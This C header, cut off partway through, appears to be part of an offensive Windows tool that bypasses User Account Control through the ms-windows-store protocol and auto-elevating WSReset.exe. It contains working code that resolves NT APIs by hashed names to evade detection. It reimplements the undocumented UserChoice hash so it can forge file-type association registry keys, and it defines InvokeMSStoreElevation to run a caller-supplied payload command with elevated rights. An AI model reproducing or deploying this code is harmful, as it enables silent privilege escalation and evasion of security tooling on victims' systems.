#ifndef MSSTOREFTA_H
#define MSSTOREFTA_H

#include "winapi_loader.h"
#include <ntstatus.h>
#include <shellapi.h>
#include <stdint.h>

#ifndef SECURITY_MAX_SID_STRING_CHARACTERS
#define SECURITY_MAX_SID_STRING_CHARACTERS (2 + 4 + 15 + (11 * SID_MAX_SUB_AUTHORITIES) + 1)
#endif

// -------------------- Types --------------------
typedef enum _KEY_INFORMATION_CLASS {
    KeyBasicInformation = 0,
    KeyNodeInformation = 1,
    KeyFullInformation = 2
} KEY_INFORMATION_CLASS;

typedef NTSTATUS (NTAPI *NtOpenProcessToken_t)(HANDLE, ACCESS_MASK, PHANDLE);
typedef NTSTATUS (NTAPI *NtQueryInformationToken_t)(HANDLE, TOKEN_INFORMATION_CLASS, PVOID, ULONG, PULONG);
typedef NTSTATUS (NTAPI *NtClose_t)(HANDLE);
typedef NTSTATUS (NTAPI *NtCreateKey_t)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, ULONG, PUNICODE_STRING, ULONG, PULONG);
typedef NTSTATUS (NTAPI *NtOpenKey_t)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES);
typedef NTSTATUS (NTAPI *NtSetValueKey_t)(HANDLE, PUNICODE_STRING, ULONG, ULONG, PVOID, ULONG);
typedef NTSTATUS (NTAPI *NtEnumerateKey_t)(HANDLE, ULONG, KEY_INFORMATION_CLASS, PVOID, ULONG, PULONG);
typedef NTSTATUS (NTAPI *NtDeleteKey_t)(HANDLE);
typedef NTSTATUS (NTAPI *NtWaitForSingleObject_t)(HANDLE, BOOLEAN, PLARGE_INTEGER);

typedef BOOL (WINAPI *ShellExecuteExW_t)(LPSHELLEXECUTEINFOW);

typedef struct _KEY_BASIC_INFORMATION {
    LARGE_INTEGER LastWriteTime;
    ULONG TitleIndex;
    ULONG NameLength;
    WCHAR Name[1];
} KEY_BASIC_INFORMATION, *PKEY_BASIC_INFORMATION;

typedef struct {
    DWORD state[4];
    DWORD count[2];
    BYTE buffer[64];
} MD5_CTX;

typedef struct _NT_API {
    HMODULE hNtdll;
    HMODULE hShell32;

    NtCreateKey_t   NtCreateKey;
    NtOpenKey_t     NtOpenKey;
    NtSetValueKey_t NtSetValueKey;
    NtClose_t       NtClose;

    wchar_t sid[SECURITY_MAX_SID_STRING_CHARACTERS];
} NT_API;

// -------------------- Strings --------------------
#define ntopenprocesstoken HASH("NtOpenProcessToken")
#define ntqueryinformationtoken HASH("NtQueryInformationToken")
#define ntclose HASH("NtClose")
#define ntcreatekey HASH("NtCreateKey")
#define ntopenkey HASH("NtOpenKey")
#define ntsetvaluekey HASH("NtSetValueKey")
#define ntdeletekey HASH("NtDeleteKey")
#define ntenumeratekey HASH("NtEnumerateKey")
#define ntwaitforsingleobject HASH("NtWaitForSingleObject")
#define shellexecuteexw HASH("ShellExecuteExW")

STRINGW(shell32_dll, "shell32.dll")
STRINGA(search, "User Choice")
STRINGA(hx, "0123456789ABCDEF")
STRINGA(b64_table, "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/")
STRINGW(mswinstore, "ms-windows-store")
STRINGW(hash, "Hash")
STRINGW(progid, "ProgId")
STRINGW(reguser, "\\Registry\\User\\")
STRINGW(pre, "\\Software\\Classes\\")
STRINGW(suf, "\\shell\\open\\command")
STRINGW(open, "open")
STRINGW(autoele_exe, "\\System32\\WSReset.exe")
STRINGW(assoc, "Software\\Microsoft\\Windows\\Shell\\Associations\\UrlAssociations\\ms-windows-store")
STRINGW(subkey, "Software\\Microsoft\\Windows\\Shell\\Associations\\UrlAssociations\\ms-windows-store\\UserChoice")

// -------------------- Helpers --------------------
#define F(x,y,z) (((x) & (y)) | (~(x) & (z)))
#define G(x,y,z) (((x) & (z)) | ((y) & ~(z)))
#define H(x,y,z) ((x) ^ (y) ^ (z))
#define I(x,y,z) ((y) ^ ((x) | ~(z)))

#define ROTL(x,n) (((x) << (n)) | ((x) >> (32-(n))))

#define FF(a,b,c,d,x,s,ac) \
 (a) += F((b),(c),(d)) + (x) + (DWORD)(ac); \
 (a) = ROTL((a),(s)); \
 (a) += (b);

#define GG(a,b,c,d,x,s,ac) \
 (a) += G((b),(c),(d)) + (x) + (DWORD)(ac); \
 (a) = ROTL((a),(s)); \
 (a) += (b);

#define HH(a,b,c,d,x,s,ac) \
 (a) += H((b),(c),(d)) + (x) + (DWORD)(ac); \
 (a) = ROTL((a),(s)); \
 (a) += (b);

#define II(a,b,c,d,x,s,ac) \
 (a) += I((b),(c),(d)) + (x) + (DWORD)(ac); \
 (a) = ROTL((a),(s)); \
 (a) += (b);

#define READ_I32_LE(p) \
    ((int32_t)(((uint32_t)((const BYTE*)(p))[0]) | \
        ((uint32_t)((const BYTE*)(p))[1] << 8) | \
        ((uint32_t)((const BYTE*)(p))[2] << 16) | \
        ((uint32_t)((const BYTE*)(p))[3] << 24) ))

#define CONVERT_I32(v) ((int32_t)((uint32_t)(v)))

#define PS_SHR(v, c) \
    (((((int64_t)(v)) & 0x80000000LL) != 0) \
        ? (int32_t)((((int64_t)(v)) >> (c)) ^ 0xFFFF0000LL) \
        : (int32_t)(((int64_t)(v)) >> (c)))

static SIZE_T wlen_(const wchar_t *s) {
    SIZE_T n = 0;
    while (s[n]) ++n;
    return n;
}

static void wcat_(wchar_t *dst, const wchar_t *src) {
    while (*dst) ++dst;
    while ((*dst++ = *src++) != L'\0');
}

static void wcopy_(wchar_t *dst, const wchar_t *src, size_t *j) {
    for (size_t i = 0; src[i]; i++)
        dst[(*j)++] = src[i];
}

// -------------------- SID Helpers --------------------
static unsigned long long ia_to_u64(const SID* s) {
    return
        ((unsigned long long)s->IdentifierAuthority.Value[5]) |
        ((unsigned long long)s->IdentifierAuthority.Value[4] << 8)  |
        ((unsigned long long)s->IdentifierAuthority.Value[3] << 16) |
        ((unsigned long long)s->IdentifierAuthority.Value[2] << 24) |
        ((unsigned long long)s->IdentifierAuthority.Value[1] << 32) |
        ((unsigned long long)s->IdentifierAuthority.Value[0] << 40);
}

static wchar_t* append_u64(wchar_t* p, unsigned long long v) {
    if (v >= 10)
        p = append_u64(p, v / 10);

    *p++ = L'0' + (v % 10);
    return p;
}

static void sid_to_string(PSID sid, wchar_t* out) {
    SID* s = (SID*)sid;
    wchar_t* p = out;

    *p++ = L'S';
    *p++ = L'-';

    p = append_u64(p, s->Revision);

    *p++ = L'-';

    unsigned long long ia = ia_to_u64(s);

    p = append_u64(p, ia);

    for (ULONG k = 0; k < s->SubAuthorityCount; k++) {
        *p++ = L'-';
        p = append_u64(p, s->SubAuthority[k]);
    }

    *p = L'\0';
}

// -------------------- FTA Helpers --------------------
static void get_sid(NT_API *api) {
    NtOpenProcessToken_t NtOpenProcessToken = (NtOpenProcessToken_t)myGetProcAddressH(api->hNtdll, ntopenprocesstoken);
    NtQueryInformationToken_t NtQueryInformationToken = (NtQueryInformationToken_t)myGetProcAddressH(api->hNtdll, ntqueryinformationtoken);

    HANDLE hToken;
    ULONG len = 0;

    NtOpenProcessToken((HANDLE)-1, TOKEN_QUERY, &hToken);
    NtQueryInformationToken(hToken, TokenUser, NULL, 0, &len);

    unsigned char buffer[len];

    NtQueryInformationToken(hToken, TokenUser, buffer, len, &len);

    api->NtClose(hToken);

    TOKEN_USER *tu = (TOKEN_USER *)buffer;

    sid_to_string(tu->User.Sid, api->sid);
}

static wchar_t *get_user_experience(NT_API *api) {
    IMAGE_DOS_HEADER *dos = (IMAGE_DOS_HEADER *)api->hShell32;
    IMAGE_NT_HEADERS64 *nt = (IMAGE_NT_HEADERS64 *)((BYTE *)api->hShell32 + dos->e_lfanew);

    wchar_t *mem = (wchar_t *)api->hShell32;
    size_t size = nt->OptionalHeader.SizeOfImage / sizeof(wchar_t);

    size_t searchLen = (sizeof(search) / sizeof(search[0])) - 1;
    size_t limit = size - searchLen;

    for (size_t i = 0; i <= limit; i++) {
        size_t k = 0;

        for (; k < searchLen; k++) {
            if (mem[i + k] != search[k])
                break;
        }

        if (k == searchLen) {
            return mem + i;
        }
    }

    return NULL;
}

static void get_hex_datetime(wchar_t out[17]) {
    volatile const unsigned long *p = (volatile const unsigned long *)(0x7FFE0014ULL);

    unsigned long hi1, lo, hi2;
    unsigned long long v;

    do {
        hi1 = p[1];
        lo  = p[0];
        hi2 = p[2];
    } while (hi1 != hi2);

    v = ((unsigned long long)hi2 << 32) | lo;
    v -= v % 600000000ULL;

    {
        unsigned long hi  = (unsigned long)(v >> 32);
        unsigned long lo2 = (unsigned long)(v & 0xFFFFFFFFULL);

        out[0]  = hx[(hi >> 28) & 0xF];
        out[1]  = hx[(hi >> 24) & 0xF];
        out[2]  = hx[(hi >> 20) & 0xF];
        out[3]  = hx[(hi >> 16) & 0xF];
        out[4]  = hx[(hi >> 12) & 0xF];
        out[5]  = hx[(hi >> 8)  & 0xF];
        out[6]  = hx[(hi >> 4)  & 0xF];
        out[7]  = hx[hi & 0xF];

        out[8]  = hx[(lo2 >> 28) & 0xF];
        out[9]  = hx[(lo2 >> 24) & 0xF];
        out[10] = hx[(lo2 >> 20) & 0xF];
        out[11] = hx[(lo2 >> 16) & 0xF];
        out[12] = hx[(lo2 >> 12) & 0xF];
        out[13] = hx[(lo2 >> 8)  & 0xF];
        out[14] = hx[(lo2 >> 4)  & 0xF];
        out[15] = hx[lo2 & 0xF];
        out[16] = L'\0';
    }
}

// -------------------- Hash Helpers --------------------
static void b64_encode(const BYTE *data, DWORD cbData, wchar_t *outBuf) {    
    DWORD i = 0, j = 0;
    DWORD outLen = 4 * ((cbData + 2) / 3);

    while (i < cbData)
    {
        DWORD a = i < cbData ? data[i++] : 0;
        DWORD b = i < cbData ? data[i++] : 0;
        DWORD c = i < cbData ? data[i++] : 0;

        DWORD triple = (a << 16) | (b << 8) | c;

        outBuf[j++] = (wchar_t)b64_table[(triple >> 18) & 0x3F];
        outBuf[j++] = (wchar_t)b64_table[(triple >> 12) & 0x3F];
        outBuf[j++] = (wchar_t)b64_table[(triple >> 6) & 0x3F];
        outBuf[j++] = (wchar_t)b64_table[triple & 0x3F];
    }

    for (DWORD k = 0; k < (3 - (cbData % 3)) % 3; k++)
        outBuf[outLen - 1 - k] = L'=';

    outBuf[outLen] = L'\0';
}

static void md5_transform(DWORD state[4], const BYTE block[64]);

static void md5_init(MD5_CTX *ctx) {
    ctx->count[0] = ctx->count[1] = 0;

    ctx->state[0] = 0x67452301;
    ctx->state[1] = 0xefcdab89;
    ctx->state[2] = 0x98badcfe;
    ctx->state[3] = 0x10325476;
}

static void md5_update(MD5_CTX *ctx, const BYTE *input, DWORD len) {
    DWORD i, index, partLen;

    index = (DWORD)((ctx->count[0] >> 3) & 0x3F);

    if ((ctx->count[0] += (len << 3)) < (len << 3))
        ctx->count[1]++;

    ctx->count[1] += (len >> 29);

    partLen = 64 - index;

    if (len >= partLen)
    {
        char *dst = (char *)&ctx->buffer[index];
        const char *src = (const char *)input;

        for (size_t i = 0; i < partLen; i++) {
            dst[i] = src[i];
        }
		
        md5_transform(ctx->state, ctx->buffer);

        for (i = partLen; i + 63 < len; i += 64)
            md5_transform(ctx->state, &input[i]);

        index = 0;
    }
    else
    {
        i = 0;
    }

    unsigned char *dst = (unsigned char *)&ctx->buffer[index];
    const unsigned char *src = (const unsigned char *)&input[i];

    size_t n = len - i;
    for (size_t k = 0; k < n; k++) {
        dst[k] = src[k];
    }
}

static void md5_final(MD5_CTX *ctx, BYTE digest[16]) {
    BYTE padding[64] = { 0x80 };

    BYTE bits[8];
    DWORD index, padLen;

    for (DWORD i = 0; i < 8; i++)
        bits[i] = (BYTE)((ctx->count[i >> 2] >> ((i & 3) * 8)) & 0xFF);

    index = (ctx->count[0] >> 3) & 0x3F;
    padLen = (index < 56) ? (56 - index) : (120 - index);

    md5_update(ctx, padding, padLen);
    md5_update(ctx, bits, 8);

    for (DWORD i = 0; i < 16; i++)
    {
        digest[i] = (BYTE)((ctx->state[i >> 2] >> ((i & 3) * 8)) & 0xFF);
    }
}

static void md5_transform(DWORD state[4], const BYTE block[64]) {
    DWORD x[16];
    DWORD a = state[0], b = state[1], c = state[2], d = state[3];

    for (DWORD i = 0, j = 0; i < 16; i++, j += 4)
        x[i] = ((DWORD)block[j]) |
               ((DWORD)block[j + 1] << 8)  |
               ((DWORD)block[j + 2] << 16) |
               ((DWORD)block[j + 3] << 24);

    /* Round 1 */
    FF(a,b,c,d,x[ 0], 7,0xd76aa478);
    FF(d,a,b,c,x[ 1],12,0xe8c7b756);
    FF(c,d,a,b,x[ 2],17,0x242070db);
    FF(b,c,d,a,x[ 3],22,0xc1bdceee);
    FF(a,b,c,d,x[ 4], 7,0xf57c0faf);
    FF(d,a,b,c,x[ 5],12,0x4787c62a);
    FF(c,d,a,b,x[ 6],17,0xa8304613);
    FF(b,c,d,a,x[ 7],22,0xfd469501);
    FF(a,b,c,d,x[ 8], 7,0x698098d8);
    FF(d,a,b,c,x[ 9],12,0x8b44f7af);
    FF(c,d,a,b,x[10],17,0xffff5bb1);
    FF(b,c,d,a,x[11],22,0x895cd7be);
    FF(a,b,c,d,x[12], 7,0x6b901122);
    FF(d,a,b,c,x[13],12,0xfd987193);
    FF(c,d,a,b,x[14],17,0xa679438e);
    FF(b,c,d,a,x[15],22,0x49b40821);

    /* Round 2 */
    GG(a,b,c,d,x[ 1], 5,0xf61e2562);
    GG(d,a,b,c,x[ 6], 9,0xc040b340);
    GG(c,d,a,b,x[11],14,0x265e5a51);
    GG(b,c,d,a,x[ 0],20,0xe9b6c7aa);
    GG(a,b,c,d,x[ 5], 5,0xd62f105d);
    GG(d,a,b,c,x[10], 9,0x02441453);
    GG(c,d,a,b,x[15],14,0xd8a1e681);
    GG(b,c,d,a,x[ 4],20,0xe7d3fbc8);
    GG(a,b,c,d,x[ 9], 5,0x21e1cde6);
    GG(d,a,b,c,x[14], 9,0xc33707d6);
    GG(c,d,a,b,x[ 3],14,0xf4d50d87);
    GG(b,c,d,a,x[ 8],20,0x455a14ed);
    GG(a,b,c,d,x[13], 5,0xa9e3e905);
    GG(d,a,b,c,x[ 2], 9,0xfcefa3f8);
    GG(c,d,a,b,x[ 7],14,0x676f02d9);
    GG(b,c,d,a,x[12],20,0x8d2a4c8a);

    /* Round 3 */
    HH(a,b,c,d,x[ 5], 4,0xfffa3942);
    HH(d,a,b,c,x[ 8],11,0x8771f681);
    HH(c,d,a,b,x[11],16,0x6d9d6122);
    HH(b,c,d,a,x[14],23,0xfde5380c);
    HH(a,b,c,d,x[ 1], 4,0xa4beea44);
    HH(d,a,b,c,x[ 4],11,0x4bdecfa9);
    HH(c,d,a,b,x[ 7],16,0xf6bb4b60);
    HH(b,c,d,a,x[10],23,0xbebfbc70);
    HH(a,b,c,d,x[13], 4,0x289b7ec6);
    HH(d,a,b,c,x[ 0],11,0xeaa127fa);
    HH(c,d,a,b,x[ 3],16,0xd4ef3085);
    HH(b,c,d,a,x[ 6],23,0x04881d05);
    HH(a,b,c,d,x[ 9], 4,0xd9d4d039);
    HH(d,a,b,c,x[12],11,0xe6db99e5);
    HH(c,d,a,b,x[15],16,0x1fa27cf8);
    HH(b,c,d,a,x[ 2],23,0xc4ac5665);

    /* Round 4 */
    II(a,b,c,d,x[ 0], 6,0xf4292244);
    II(d,a,b,c,x[ 7],10,0x432aff97);
    II(c,d,a,b,x[14],15,0xab9423a7);
    II(b,c,d,a,x[ 5],21,0xfc93a039);
    II(a,b,c,d,x[12], 6,0x655b59c3);
    II(d,a,b,c,x[ 3],10,0x8f0ccc92);
    II(c,d,a,b,x[10],15,0xffeff47d);
    II(b,c,d,a,x[ 1],21,0x85845dd1);
    II(a,b,c,d,x[ 8], 6,0x6fa87e4f);
    II(d,a,b,c,x[15],10,0xfe2ce6e0);
    II(c,d,a,b,x[ 6],15,0xa3014314);
    II(b,c,d,a,x[13],21,0x4e0811a1);
    II(a,b,c,d,x[ 4], 6,0xf7537e82);
    II(d,a,b,c,x[11],10,0xbd3af235);
    II(c,d,a,b,x[ 2],15,0x2ad7d2bb);
    II(b,c,d,a,x[ 9],21,0xeb86d391);

    state[0] += a;
    state[1] += b;
    state[2] += c;
    state[3] += d;
}

static void md5_bytes(const BYTE *data, DWORD len, BYTE out16[16]) {
    MD5_CTX ctx;

    md5_init(&ctx);
    md5_update(&ctx, data, len);
    md5_final(&ctx, out16);
}

static wchar_t *get_hash(const wchar_t *baseInfo, wchar_t *b64Out) {
    BYTE md5[16];
    BYTE outHash[16];
    BYTE outHashBase[8];

    wchar_t *b64 = 0;

    unsigned long wcharCount = 0;
    const wchar_t *p = baseInfo;
    while (*p++) wcharCount++;

    unsigned long baseLenBytes = (unsigned long)(wcharCount * sizeof(wchar_t) + sizeof(wchar_t));

    BYTE bytesBaseInfo[baseLenBytes];

    for (unsigned long i = 0; i < baseLenBytes; i++)
        bytesBaseInfo[i] = 0;

    const BYTE *src = (const BYTE *)baseInfo;
    for (unsigned long i = 0; i < wcharCount * sizeof(wchar_t); i++)
        bytesBaseInfo[i] = src[i];

    md5_bytes(bytesBaseInfo, baseLenBytes, md5);

    int32_t lengthBase = (int32_t)baseLenBytes;
    int32_t length = ((((lengthBase & 4) <= 1) ? 1 : 0) + (lengthBase >> 2) - 1);

    if (length > 1)
    {
        int32_t MD51 = ((READ_I32_LE(md5) | 1) + 0x69FB0000L);
        int32_t MD52 = ((READ_I32_LE(md5 + 4) | 1) + 0x13DB0000L);

        int32_t INDEX = PS_SHR((int64_t)(length - 2), 1);
        int32_t COUNTER = INDEX + 1;

        int32_t PDATA = 0, CACHE = 0, OUTHASH1 = 0, OUTHASH2 = 0;

        while (COUNTER--)
        {
            int32_t R0 = CONVERT_I32((int64_t)READ_I32_LE(bytesBaseInfo + PDATA) + (int64_t)OUTHASH1);
            int32_t R1_0 = CONVERT_I32((int64_t)READ_I32_LE(bytesBaseInfo + PDATA + 4));
            PDATA += 8;

            int32_t R2_0 = CONVERT_I32(((int64_t)R0 * (int64_t)MD51) - (0x10FA9605LL * (int64_t)PS_SHR((int64_t)R0, 16)));
            int32_t R2_1 = CONVERT_I32((0x79F8A395LL * (int64_t)R2_0) + (0x689B6B9FLL * (int64_t)PS_SHR((int64_t)R2_0, 16)));
            int32_t R3   = CONVERT_I32((0xEA970001LL * (int64_t)R2_1) - (0x3C101569LL * (int64_t)PS_SHR((int64_t)R2_1, 16)));

            int32_t R4_0 = CONVERT_I32((int64_t)R3 + (int64_t)R1_0);
            int32_t R5_0 = CONVERT_I32((int64_t)CACHE + (int64_t)R3);

            int32_t R6_0 = CONVERT_I32(((int64_t)R4_0 * (int64_t)MD52) - (0x3CE8EC25LL * (int64_t)PS_SHR((int64_t)R4_0, 16)));
            int32_t R6_1 = CONVERT_I32((0x59C3AF2DLL * (int64_t)R6_0) - (0x2232E0F1LL * (int64_t)PS_SHR((int64_t)R6_0, 16)));

            OUTHASH1 = CONVERT_I32((0x1EC90001LL * (int64_t)R6_1) + (0x35BD1EC9LL * (int64_t)PS_SHR((int64_t)R6_1, 16)));
            OUTHASH2 = CONVERT_I32((int64_t)R5_0 + (int64_t)OUTHASH1);

            CACHE = OUTHASH2;
        }

        for (int i = 0; i < 4; i++)
        {
            outHash[i]     = ((BYTE *)&OUTHASH1)[i];
            outHash[i + 4] = ((BYTE *)&OUTHASH2)[i];
        }

        MD51 = (READ_I32_LE(md5) | 1);
        MD52 = (READ_I32_LE(md5 + 4) | 1);

        INDEX = PS_SHR((int64_t)(length - 2), 1);
        COUNTER = INDEX + 1;

        PDATA = 0;
        CACHE = 0;
        OUTHASH1 = 0;
        OUTHASH2 = 0;

        while (COUNTER--)
        {
            int32_t R0 = CONVERT_I32((int64_t)READ_I32_LE(bytesBaseInfo + PDATA) + (int64_t)OUTHASH1);
            PDATA += 8;

            int32_t R1_0 = CONVERT_I32((int64_t)R0 * (int64_t)MD51);
            int32_t R1_1 = CONVERT_I32((0xB1110000LL * (int64_t)R1_0) - (0x30674EEFLL * (int64_t)PS_SHR((int64_t)R1_0, 16)));
            int32_t R2_0 = CONVERT_I32((0x5B9F0000LL * (int64_t)R1_1) - (0x78F7A461LL * (int64_t)PS_SHR((int64_t)R1_1, 16)));
            int32_t R2_1 = CONVERT_I32((0x12CEB96DLL * (int64_t)PS_SHR((int64_t)R2_0, 16)) - (0x46930000LL * (int64_t)R2_0));
            int32_t R3   = CONVERT_I32((0x1D830000LL * (int64_t)R2_1) + (0x257E1D83LL * (int64_t)PS_SHR((int64_t)R2_1, 16)));

            int32_t R4_0 = CONVERT_I32((int64_t)MD52 * ((int64_t)R3 + (int64_t)READ_I32_LE(bytesBaseInfo + PDATA - 4)));
            int32_t R4_1 = CONVERT_I32((0x16F50000LL * (int64_t)R4_0) - (0x5D8BE90BLL * (int64_t)PS_SHR((int64_t)R4_0, 16)));
            int32_t R5_0 = CONVERT_I32((0x96FF0000LL * (int64_t)R4_1) - (0x2C7C6901LL * (int64_t)PS_SHR((int64_t)R4_1, 16)));
            int32_t R5_1 = CONVERT_I32((0x2B890000LL * (int64_t)R5_0) + (0x7C932B89LL * (int64_t)PS_SHR((int64_t)R5_0, 16)));

            OUTHASH1 = CONVERT_I32((0x9F690000LL * (int64_t)R5_1) - (0x405B6097LL * (int64_t)PS_SHR((int64_t)R5_1, 16)));
            OUTHASH2 = CONVERT_I32((int64_t)OUTHASH1 + (int64_t)CACHE + (int64_t)R3);

            CACHE = OUTHASH2;
        }

        for (int i = 0; i < 4; i++)
        {
            outHash[i + 8]  = ((BYTE *)&OUTHASH1)[i];
            outHash[i + 12] = ((BYTE *)&OUTHASH2)[i];
        }

        int32_t hashValue1 = READ_I32_LE(outHash + 8) ^ READ_I32_LE(outHash + 0);
        int32_t hashValue2 = READ_I32_LE(outHash + 12) ^ READ_I32_LE(outHash + 4);

        for (int i = 0; i < 4; i++)
        {
            outHashBase[i]     = ((BYTE *)&hashValue1)[i];
            outHashBase[i + 4] = ((BYTE *)&hashValue2)[i];
        }

        b64_encode(outHashBase, 8, b64Out);
        b64 = b64Out;
    }

    return b64;
}

// -------------------- Registry Helpers --------------------
static void guid_to_progid(wchar_t out[39]) {
    unsigned char g[16];
    uint32_t s = 0;

    uint32_t x = (uint32_t)(uintptr_t)&s;
    uint32_t y = (uint32_t)(uintptr_t)&g;

    s = x ^ (y * 0x9E3779B9u);
    if (s == 0)
        s = 2463534242u;

    unsigned char *p = g;
    /* xorshift32 */
    for (int i = 0; i < 16; ++i) {
        s ^= s << 13;
        s ^= s >> 17;
        s ^= s << 5;

        p[i] = (unsigned char)(s >> ((i & 3) * 8));
    }

    p[6] = (p[6] & 0x0F) | 0x40; // version 4
    p[8] = (p[8] & 0x3F) | 0x80; // RFC4122 variant

    int i2 = 0;
    out[i2++] = L'{';

    // Data1 (p[0..3])
    for (int i = 3; i >= 0; --i) {
        unsigned char b = p[3 - i];
        out[i2++] = hx[b >> 4];
        out[i2++] = hx[b & 0x0F];
    }

    out[i2++] = L'-';

    // Data2 (p[4..5])
    for (int i = 5; i >= 4; --i) {
        unsigned char b = p[9 - i];
        out[i2++] = hx[b >> 4];
        out[i2++] = hx[b & 0x0F];
    }

    out[i2++] = L'-';

    // Data3 (p[6..7])
    for (int i = 7; i >= 6; --i) {
        unsigned char b = p[13 - i];
        out[i2++] = hx[b >> 4];
        out[i2++] = hx[b & 0x0F];
    }

    out[i2++] = L'-';

    // Data4[0..1]
    for (int j = 8; j < 10; ++j) {
        unsigned char b = p[j];
        out[i2++] = hx[b >> 4];
        out[i2++] = hx[b & 0x0F];
    }

    out[i2++] = L'-';

    // Data4[2..7]
    for (int j = 10; j < 16; ++j) {
        unsigned char b = p[j];
        out[i2++] = hx[b >> 4];
        out[i2++] = hx[b & 0x0F];
    }

    out[i2++] = L'}';
    out[i2] = L'\0';
}

static NTSTATUS delete_registry_tree(NT_API *api, HANDLE hParent, const wchar_t *subkey) {
    NtEnumerateKey_t NtEnumerateKey = (NtEnumerateKey_t)myGetProcAddressH(api->hNtdll, ntenumeratekey);
    NtDeleteKey_t NtDeleteKey = (NtDeleteKey_t)myGetProcAddressH(api->hNtdll, ntdeletekey);
    
	NTSTATUS status;
    HANDLE hKey = NULL;

    UNICODE_STRING us;
    OBJECT_ATTRIBUTES oa;

    InitUnicodeString(&us, subkey);

    InitializeObjectAttributes(&oa, &us, OBJ_CASE_INSENSITIVE, hParent, NULL);

    api->NtOpenKey(&hKey, DELETE | KEY_ENUMERATE_SUB_KEYS | KEY_QUERY_VALUE | KEY_SET_VALUE, &oa);

    for (;;)
    {
        ULONG needed = 0;

        status = NtEnumerateKey(hKey, 0, KeyBasicInformation, NULL, 0, &needed);

        if (status == STATUS_NO_MORE_ENTRIES)
            break;

        if (status != STATUS_BUFFER_TOO_SMALL && status != STATUS_BUFFER_OVERFLOW)
        {
            api->NtClose(hKey);
            return status;
        }

        BYTE buffer[needed];

        status = NtEnumerateKey(hKey, 0, KeyBasicInformation, buffer, needed, &needed);

        if (!NT_SUCCESS(status))
        {
            api->NtClose(hKey);
            return status;
        }

        KEY_BASIC_INFORMATION *info = (KEY_BASIC_INFORMATION *)buffer;

        ULONG chars = info->NameLength / sizeof(WCHAR);

        WCHAR child[chars + 1];

        for (ULONG i = 0; i < chars; ++i)
            child[i] = info->Name[i];

        child[chars] = 0;

        status = delete_registry_tree(api, hKey, child);

        if (!NT_SUCCESS(status))
        {
            api->NtClose(hKey);
            return status;
        }
    }

    status = NtDeleteKey(hKey);

    api->NtClose(hKey);

    return status;
}

static BOOL write_protocol_keys(NT_API *api, HANDLE hRoot, const wchar_t *progId, const wchar_t *progHash) {
    HANDLE hParent = NULL, hChild = NULL;
    UNICODE_STRING us;
    OBJECT_ATTRIBUTES oa;
    NTSTATUS status;

    hParent = hRoot;

    const wchar_t *p = subkey;

    while (*p)
    {
        while (*p == L'\\')
            p++;

        if (!*p)
            break;

        const wchar_t *start = p;

        while (*p && *p != L'\\')
            p++;

        size_t n = p - start;
        wchar_t comp[n + 1];

        for (size_t i = 0; i < n; i++)
            comp[i] = start[i];

        comp[n] = 0;

        InitUnicodeString(&us, comp);
        InitializeObjectAttributes(&oa, &us, OBJ_CASE_INSENSITIVE, hParent, NULL);

        status = api->NtCreateKey(&hChild, KEY_CREATE_SUB_KEY | KEY_SET_VALUE | KEY_ENUMERATE_SUB_KEYS | DELETE, &oa, 0, NULL, REG_OPTION_NON_VOLATILE, NULL);

        if (!NT_SUCCESS(status))
        {
            if (hParent != hRoot)
                api->NtClose(hParent);

            delete_registry_tree(api, hRoot, assoc);
            return FALSE;
        }

        if (hParent != hRoot)
            api->NtClose(hParent);

        hParent = hChild;
        hChild = NULL;
    }

    UNICODE_STRING hashName;
    InitUnicodeString(&hashName, hash);

    status = api->NtSetValueKey(hParent, &hashName, 0, REG_SZ, (PVOID)progHash, (wlen_(progHash) + 1) * sizeof(wchar_t));

    if (!NT_SUCCESS(status))
    {
        if (hParent != hRoot)
            api->NtClose(hParent);

        delete_registry_tree(api, hRoot, assoc);
        return FALSE;
    }

    UNICODE_STRING progidName;
    InitUnicodeString(&progidName, progid);

    status = api->NtSetValueKey(hParent, &progidName, 0, REG_SZ, (PVOID)progId, (wlen_(progId) + 1) * sizeof(wchar_t));

    if (!NT_SUCCESS(status))
    {
        if (hParent != hRoot)
            api->NtClose(hParent);

        delete_registry_tree(api, hRoot, assoc);
        return FALSE;
    }

    if (hParent != hRoot)
        api->NtClose(hParent);

    return TRUE;
}

// -------------------- Core Logic --------------------
BOOL SetFTA(NT_API *api, HANDLE hRoot, const wchar_t *progId, const wchar_t *extension) {
    wchar_t hexTime[17];
    get_hex_datetime(hexTime);
	
    wchar_t *exp = get_user_experience(api);

    BOOL result = FALSE;

    SIZE_T len = wlen_(extension) + wlen_(api->sid) + wlen_(progId) + wlen_(hexTime) + wlen_(exp) + 1;

    wchar_t baseInfo[len];
    baseInfo[0] = L'\0';

    wcat_(baseInfo, extension);
    wcat_(baseInfo, api->sid);
    wcat_(baseInfo, progId);
    wcat_(baseInfo, hexTime);
    wcat_(baseInfo, exp);

    for (SIZE_T i = 0; baseInfo[i]; i++)
        if (baseInfo[i] >= L'A' && baseInfo[i] <= L'Z')
            baseInfo[i] += 0x20;

    wchar_t hashBuf[16];
    get_hash(baseInfo, hashBuf);

    if (write_protocol_keys(api, hRoot, progId, hashBuf))
        result = TRUE;

    return result;
}

int InvokeMSStoreElevation(const wchar_t* payloadCmd) {
    NT_API api;
    api.hNtdll = myGetModuleHandleH(ntdll_dll);

    api.NtCreateKey = (NtCreateKey_t)myGetProcAddressH(api.hNtdll, ntcreatekey);
    api.NtOpenKey = (NtOpenKey_t)myGetProcAddressH(api.hNtdll, ntopenkey);
    api.NtSetValueKey = (NtSetValueKey_t)myGetProcAddressH(api.hNtdll, ntsetvaluekey);
    api.NtClose = (NtClose_t)myGetProcAddressH(api.hNtdll, ntclose);
    NtWaitForSingleObject_t NtWaitForSingleObject = (NtWaitForSingleObject_t)myGetProcAddressH(api.hNtdll, ntwaitforsingleobject);
    LdrLoadDll_t LdrLoadDll = (LdrLoadDll_t)myGetProcAddressH(api.hNtdll, ldrloadll);

    int result = 0;

    wchar_t progid[39];
    guid_to_progid(progid);

    get_sid(&api);

    size_t rootLen = wlen_(reguser) + wlen_(api.sid) + 1;
    
    wchar_t rootPath[rootLen];
    
    size_t m = 0;
    wcopy_(rootPath, reguser, &m);
    wcopy_(rootPath, api.sid, &m);
    rootPath[m] = L'\0';
    
    UNICODE_STRING usRoot;
    OBJECT_ATTRIBUTES oaRoot;
    HANDLE hRoot = NULL;
    
    InitUnicodeString(&usRoot, rootPath);
    InitializeObjectAttributes(&oaRoot, &usRoot, OBJ_CASE_INSENSITIVE, NULL, NULL);
    
